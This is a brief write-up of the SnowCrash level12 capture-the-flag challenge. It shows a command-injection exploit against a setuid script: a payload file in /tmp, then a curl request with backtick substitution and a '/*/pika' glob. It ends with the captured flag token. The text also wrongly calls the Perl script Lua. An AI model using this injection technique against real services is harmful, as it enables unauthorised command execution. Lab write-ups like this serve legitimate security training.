# Snowcrash12

Same story, different script

```sh
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```
The goal is also shell injection as the input is part of the command

Lua uses a lot of regex to modify it's strings
And so, our input gets in the command in uppercase so it cannot be a path to a command

But since it uses regex, we can do stuff like '/*/PAYLOAD' and it can be resolved to /tmp/PAYLOAD

the payload looks something like this 
```shell
echo "#!/bin/bash
getflag > /tmp/logfile" > /tmp/PIKA

#Then just send it
level12:~$curl 'localhost:4646?x=`/*/pika`'

level12:~$cat /tmp/logfile`'
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

```
Nice and easy